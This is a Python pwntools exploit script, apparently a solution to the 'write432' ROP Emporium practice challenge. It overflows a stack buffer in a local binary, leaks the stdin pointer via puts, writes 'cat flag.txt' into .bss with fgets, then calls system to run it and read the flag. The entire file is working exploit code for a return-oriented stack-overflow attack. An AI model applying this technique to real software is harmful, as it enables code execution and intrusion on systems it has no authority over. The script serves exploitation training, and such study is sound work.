#/usr/bin/env python

from pwn import *

context.binary = './write432'
context.log_level = 'debug'

io = process('./write432')
elf = ELF('./write432')

#leak Stdin_addr file Pointer 
io.recv()
payload1 = 'A'*(0x28+4)
payload1 += p32(elf.plt['puts'])
payload1 += p32(elf.symbols['pwnme'])
payload1 += p32(0x804A060)
gdb.attach(io)
io.sendline(payload1)
Stdin_addr = u32(io.recv(4))
log.info('Stdin_addr:'+hex(Stdin_addr))

io.recv()
payload2 = 'A'*(0x28+4)
payload2 += p32(elf.plt['fgets'])
payload2 += p32(elf.symbols['pwnme'])
payload2 += p32(elf.bss())+p32(0x20)+p32(Stdin_addr)
io.sendline(payload2)
io.sendline("cat flag.txt\x00")

io.recv()
payload ='A'*(0x28+4)
payload += p32(elf.plt['system'])
payload += p32(0)
payload += p32(elf.bss())
io.sendline(payload)
flag = io.recvline()
log.info('flag:'+flag)
io.interactive()